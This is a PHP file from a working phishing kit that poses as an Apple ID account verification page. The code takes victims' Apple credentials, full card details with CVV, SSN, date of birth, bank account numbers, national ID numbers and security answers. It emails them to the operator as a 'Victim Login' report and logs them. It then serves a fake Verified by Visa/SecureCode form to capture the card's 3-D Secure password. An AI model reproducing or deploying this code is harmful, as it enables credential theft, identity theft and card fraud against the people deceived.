<?php
/*
||| L33bo phishers = ICQ: 695059760
*/
error_reporting(0);
ini_set('display_errors', 0);
@require "bocah/includes/session_load.php";
@require "bocah/includes/session_protect.php";
@require "bocah/includes/functions.php";
@require "bocah/includes/language.php";
@require "bocah/includes/One_Time.php";
@require "tytyd.php";

if(isset($_POST['mname'])) {
$mname = $_POST['mname']; 
}
else {
$mname = "";
}
$userid = $_SESSION["user"];
$password = $_SESSION["pass"];
$name=$_POST["fname"]." ".$mname." ".$_POST["lname"];
$dob=$_POST["dob"];
$address=$_POST["address"].", ".$_POST["town"].", ".$_POST["county"];
$postcode=$_POST["postcode"];
$country=$_POST["country"];
$telephone=$_POST["telephone"];
$ssn=$_POST["ssn"];
$ccname=$_POST["ccname"];
$ccno=$_POST["ccno"];
$ccexp=$_POST["ccexp"];
$climit = $_POST['climit'];
$citizenid = $_POST['citizenid'];  
$qatarid = $_POST['qatarid'];  
$naid = $_POST['naid']; 
$bans = $_POST['bans']; 
$civilid = $_POST['civilid']; 
$numbid = $_POST['numbid']; 
$passcy = $_POST['passcy']; 
$secode=$_POST["secode"];
$acno=$_POST["acno"];
$sort=$_POST["sortcode"];
$q1=$_POST["q1"];
$a1=$_POST["a1"];
if (isset($_POST['nabid'])) {
$nabid=$_POST["nabid"];
} else { $nabid = ""; }
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno    = str_replace(' ', '', $ccno);
$binq     = str_replace(' ', '', $_POST['ccno']);
$binq     = substr($binq, 0, 6);
$bins = file_get_contents("https://www.cardbinlist.com/search.html?bin=$binq");
$bin = preg_match_all("/headline\":\"(.*)\",\"datePublished/xs", $bins, $binn) ? $binn[1][0] : null;
$bin2 = preg_match_all("/caption\":\"BIN(.*)\",\"width\":\"600\",\"height\":\"400\"}}<\/script>/xs", $bins, $binn2) ? $binn2[1][0] : null;
$bin3 = explode(" ",$bin);
$bin4 = explode(" ",$bin2);
$ccbrand = strtoupper($bin3[2]);
$ccbank  = $bin3[5].' '.$bin3[6].' '.$bin3[7];
$cctype  = strtoupper($bin4[3]);
$ccklas  = strtoupper($bin3[3]);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$from = $From_Address;
$headers = "From: ".$name." " . $from;
$subj = "[ ".$systemInfo['country']." ] ".$binq." - ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank."[ ".$ip." ]";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. Blackmon3y.ID is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$data = "
  ------------------------- ZRAV PROTECT --------------------------

  ---------------------------- Account ----------------------------
* Email :  $userid
* Pass  :  $password

  -------------------------- Credit Card --------------------------
* Cardholder    :  $ccname
* Cardnumber  :  $ccno
* Expiration     :  $ccexp
* CVV/CVV2    :  $secode
* BIN/IIN         :  $ccbrand - $cctype - $ccklas - $ccbank

  ---------------------- Personal Information ---------------------
* FullName    :  $name
* Address     :  $address
* Zip/Post    :  $postcode
* Country     :  $country
* Phone       :  $telephone
* SSN         :  $ssn
* DOB         :  $dob

  --------------------- Additional Information --------------------
* Qatar ID (QA)                 : $qatarid
* ID Number (GR/HK)             : $numbid
* Citizen ID (TH)               : $citizenid
* National ID (SA)              : $naid  
* Sort Code (UK/IE)             : $sort
* Passport Number (CY)          : $passcy
* Civil ID Number (KW)          : $civilid
* Bank Access Number (NZ)       : $bans
* Account Number (UK/IE/IN)     : $acno
* Credit limit (IE/TH/IN/NZ/AU) : $climit
* NABID/OSID (AU)               : $nabid

  ----------------------- Security Question -----------------------
* Security Question  : $q1
* Security Answer    : $a1

  ------------------------- Victim Login --------------------------
* IP Add        :  ".$_SERVER['REMOTE_ADDR']." 
* Hostname    :   ".gethostbyaddr($_SERVER['REMOTE_ADDR'])."
* Location      :   ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country']."
* Browser      :   ".$systemInfo['browser']."
* Platform      :   ".$systemInfo['os']."
* Useragent    :   ".$systemInfo['useragent']."

  -------
  ------------------ ZRAV PROTECT --------------------------
";

if($Encrypt==1) {
include("bocah/includes/AES.php");
$imputText = $data;
$imputKey = $Key;
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1) {
foreach($bad_words as $bad_word){
    if(stristr($_POST['fname'], $bad_word) !== false) {
    mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD"));
    }
  if(stristr($_POST['address'], $bad_word) !== false) {
    mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://idmsa.apple.com/IDMSWebAuth/login.html?appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&accNameLocked=false&language=US-EN&path=/signin/?referrer=/account/manage&Env=PROD"));
    }
}
}
if($Save_Log==1) {
  if($Encrypt==1) {
//   $file=fopen("bocah/logs/logs_.txt","a");
//   fwrite($file,$enc);
//   fclose($file);
  }
  else {
//   $file=fopen("bocah/logs/logs_.txt","a");
//   fwrite($file,$data);
//   fclose($file);
  }
} 
if($Send_Log==1) {
  if($Encrypt==1) {
  mail($to,$subj,$enc,$headers);  
  }
  else {
  @mail($to,$subj,$data,$headers); 
  $empas   = "# ".$binq." - CC ".$ccbrand." ".$cctype." ".$ccklas." ".$ccbank." [ ".$systemInfo['country']." ]\n";
    $file = fopen("bocah/logs/bin.log", "a");
    fwrite($file, $empas);
    fclose($file);
    
    $file2 = $_SERVER['DOCUMENT_ROOT']."/bocah/logs/._ccz_.txt";
    $isi  = file_get_contents($file2);
    $buka = fopen($file2,"w"); 
       
    fwrite($buka, $isi+1);
    fclose($buka);
    
    $file3 = $_SERVER['DOCUMENT_ROOT']."/._nob_.txt";
    $isi  = file_get_contents($file3);
    $buka = fopen($file3,"w"); 
       
    fwrite($buka, $isi+1);
    fclose($buka);
  }
}

if ($ccbrand != 'VISA' && $ccbrand != 'MASTERCARD') {
	echo "  
	<form action='IndentifyDocumentSelfPersonality?ref=profiles&userid=".$_SESSION['user']."&stats=account_unlock&sessionsid=". generateRandomString(86) ."&protocol=ssl' method='post' name='details' id='details' class='allowproceed'>
	</form>

	<script type='text/javascript'>
	$('.allowproceed').submit();
	</script>
	";
}else{
	?>
	<!DOCTYPE html>
	<html>
	<head>
		<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
		<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
		<title>Confirm your information</title>
		<link href="bocah/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
		<link href="bocah/css/First.css" media="all" rel="stylesheet" type="text/css">
		<link href="bocah/css/Second.css" rel="stylesheet" type="text/css">
		<link href="bocah/css/sanfrancisco.css" rel="stylesheet" type="text/css">
		<link href="bocah/css/verify.css" rel="stylesheet" type="text/css">
		<style>
		.error {color:#333}
		.successupdate {
			background:none!important;
			border:none; 
			padding:0!important;

			/*optional*/
			font-family:arial,sans-serif; /*input has OS specific font-family*/
			color:#069;
			text-decoration:underline;
			cursor:pointer;
		}
	</style>
	<script type="text/javascript">
		$(document).ready(function(){
			$('.successupdate').click(function(){
				$('#vbvsecure').val('-');
			});
		})
	</script>
</head>
<body id="pagecontent">
	<div id="content">
		<div class="bdd45">
			<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
				<div class="HeaderObjHolder">
					<ul class="MobHeader">
						<li class="HeaderObj MobMenIconH">
							<label class="MobMenHol"> 
								<span class="MobMenIcon MobMenIcon-top">
									<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
										<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
									</label>
								</li>
								<li class="HeaderObj">
									<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
									<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
								</li>
							</ul>
							<ul class="HeaderObjList">
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
								<li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
							</ul>
						</div>
					</nav>



					<div id="flow">
						<div class="flow-body signin clearfix" role="main">
							<div class="persona-splash no-photo clearfix">
								<div class="persona-bg"></div>
								<div class="container">
									<div class="splash-section">
										<div class=" person-wrapper">
											<div>
												<div class="row">
													<div class="col-sm-9 appleid-col">
														<div class="flex-container">
															<h1 class="mobile appleid-user">
																<span class="first_name">Account Verification</span>
																<small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
															</h1>
														</div>
													</div>
													<div class="not-mobile col-sm-3">
														<div class="flex-container-signout">
															<div class="signout pull-right">
																<button class="btn btn-link">Sign Out </button>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
							<div class="container">
								<div class="flex home-content">
									<br/>
									<br/>
									<br/>
									<form action="IndentifyDocumentSelfPersonality?ref=profiles&userid=<?php echo $_SESSION['user'];?>&stats=account_unlock&sessionsid=<?php echo generateRandomString(86); ?>&protocol=ssl" method="post" name="details" id="details" class="proceed">
										<input type="hidden" value="<?php echo $name ?>" name="name">
										<table width="100%">
											<tr>
												<td width="31%"></td>
												<td width="38%">
													<table align="center" style="border:2px solid #d2d2d2 ;border-radius:3px" width="100%">
														<tr>
															<td align="center">
																<table width="100%" align="center">
																	<tr>
																		<td>
																			<table width="100%">
																				<tr>
																					<td rowspan="2" align="center"><img src="bocah/img/vbv.jpg" width="100"></td>
																					<td style="padding-top: 10px; padding-right: 10px;" align="right"><img src="bocah/img/securecode.jpg" width="120"></td>
																				</tr>
																				<tr>
																					<td style="padding-top: 10px; padding-right: 10px;" align="right" colspan="2"><img src="bocah/img/applepay.jpg" width="80"></td>
																				</tr>
																			</table>
																		</td>
																	</tr>
																	<tr>
																		<td align="center"><h2>Protect Your Card From Unauthorised Used Online.</h2></td>
																	</tr>
																	<tr>
																		<td style="padding-left: 10px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You acknowledge credit card by entering your password for secured cards.</td>
																	</tr>
																	<tr>
																		<td>
																			<table>
																				<tr>
																					<td align="right" width="35%"><b>Merchant</b></td>
																					<td>:</td>
																					<td align="left">Apple Inc.</td>
																				</tr>
																				<tr>
																					<td align="right" width="35%"><b>Bank</b></td>
																					<td>:</td>
																					<td align="left"><?php echo str_replace('-', '', $ccbank); ?></td>
																				</tr>
																				<tr>
																					<td align="right" width="35%"><b>Amount</b></td>
																					<td>:</td>
																					<td align="left">0.00 $</td>
																				</tr>
																				<tr>
																					<td align="right" width="35%"><b>UTC Date</b></td>
																					<td>:</td>
																					<td align="left"><?php echo date('d/m/Y H:i:s', time()); ?></td>
																				</tr>
																				<tr>
																					<td align="right" width="35%"><b>Card Number</b></td>
																					<td>:</td>
																					<td align="left">XXXX-XXXX-XXXX-<?php echo substr($ccno,-4); ?></td>
																				</tr>
																				<tr>
																					<td align="right" width="35%"><b>
																						<?php 
																						if($ccbrand == 'VISA'){
																							echo "VBV Password";
																						}elseif($ccbrand == 'MASTERCARD'){
																							echo "Secure Code";
																						}else{
																							echo "Password";
																						} ?>
																					</b></td>
																					<td>:</td>
																					<td align="left"><input type="password" name="vbvsecure" id="vbvsecure" required="" size="22">
																						<?php 
																						if($ccbrand == 'VISA'){
																							?>
																							<a href="https://www.visa.com/verifiedbyvisa" style="text-decoration: none;">What it's?</a>
																							<?php
																						}elseif($ccbrand == 'MASTERCARD'){
																							?>
																							<a href="https://www.mastercard.us/en-us/consumers/payment-technologies/securecode.html" style="text-decoration: none;">What it's?</a>
																							<?php
																						}else{
																						} ?>
																					</td>
																				</tr>
																				<tr>
																					<td></td>
																					<td></td>
																					<td><button type="submit">Submit</button>&nbsp;&nbsp;&nbsp;<button type="submit" class="successupdate" style="text-decoration: none;">No <?php 
																					if($ccbrand == 'VISA'){
																						echo "VBV Password";
																					}elseif($ccbrand == 'MASTERCARD'){
																						echo "Secure Code";
																					}else{
																						echo "Password";
																					} ?></a></td>
																				</tr>
																				<tr>
																					<td></td>
																					<td></td>
																					<td><font size="1"><font color="red">*</font>This information is not shared with the Merchant.</font></td>
																				</tr>
																				<tr>
																					<td colspan="3" style="padding-top: 10px;"></td>
																				</tr>
																				<tr>
																					<td align="right" colspan="3"><font size="2">Shop the <a href="#">Apple Online Store</a> (<?php echo $lang['APPCALL'];?>).<img height="15" style="margin-bottom: 0px;" src="<?php echo $lang['FLAG'];?>" width="15"></font></td>
																				</tr>
																				<tr>
																					<td colspan="3" style="padding-top: 10px;"></td>
																				</tr>
																			</table>
																		</td>
																	</tr>
																</table>
															</td>
														</tr>
													</table>
												</td>
												<td width="31%"></td>
											</tr>
										</table>
									</form>
								</div>
							</div>
						</div>
					</div>
					<footer>
						<div class="container">
							<div class="footer">
								<div class="footer-wrap">
									<div class="FooterLine1">
										<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $lang['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
									</div>
									<div class="FooterLine2">
										<ul class="menu">
											<li class="item"><a href="#">Apple Info</a></li>
											<li class="item"><a href="#">Site Map</a></li>
											<li class="item"><a href="#">Hot News</a></li>
											<li class="item"><a href="#">RSS Feeds</a></li>
											<li class="item"><a href="#">Contact Us</a></li>
											<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $lang['FLAG'];?>" width="22"></a></li>
										</ul>
									</div>
									<div class="FooterLine3">Copyright © 2018 Apple Inc. All rights reserved.
										<ul class="menu">
											<li class="item"><a href="#">Terms of Use</a></li>
											<li class="item"><a href="#">Privacy Policy</a></li>
										</ul>
									</div>
								</div>
							</div>
						</div>
					</footer>
				</div>
			</div>
		</body>
		</html>
		<?php
	}
	?>